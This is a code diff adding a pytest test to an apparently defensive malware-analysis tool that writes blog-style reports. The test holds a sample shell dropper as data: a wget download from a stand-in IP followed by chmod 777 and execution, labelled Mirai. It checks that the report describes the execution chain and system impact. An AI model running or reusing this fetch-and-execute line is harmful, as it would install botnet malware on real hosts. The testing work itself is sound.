@@ -80,6 +80,22 @@ def test_metadata_network_iocs_surface_in_report(tmp_path: Path):
     assert "46.183.223.7" in blog
 
 
+def test_blog_includes_technical_architecture_and_system_impact():
+    # A shell dropper: wget + chmod + execute, plus a C2 host in metadata tags.
+    meta = dict(METADATA, file_type="sh", tags=["198-51-100-9", "Mirai"])
+    data = b"wget http://198.51.100.9/x; chmod 777 x; ./x\n"
+    analysis = analyze_sample_bytes(data, meta, source_name="x.sh")
+
+    blog = analysis.to_blog_markdown()
+
+    assert "## Technical Architecture & System Impact" in blog
+    assert "### Execution chain" in blog
+    assert "System surfaces touched" in blog
+    assert "Blast radius" in blog
+    # Surfaces describe host effect, not just rule names.
+    assert "botnet enlistment" in blog or "executable" in blog
+
+
 def test_read_one_member_from_password_zip_prefers_source_file(tmp_path: Path):
     zip_path = tmp_path / "sample.zip"
     with zipfile.ZipFile(zip_path, "w") as archive:
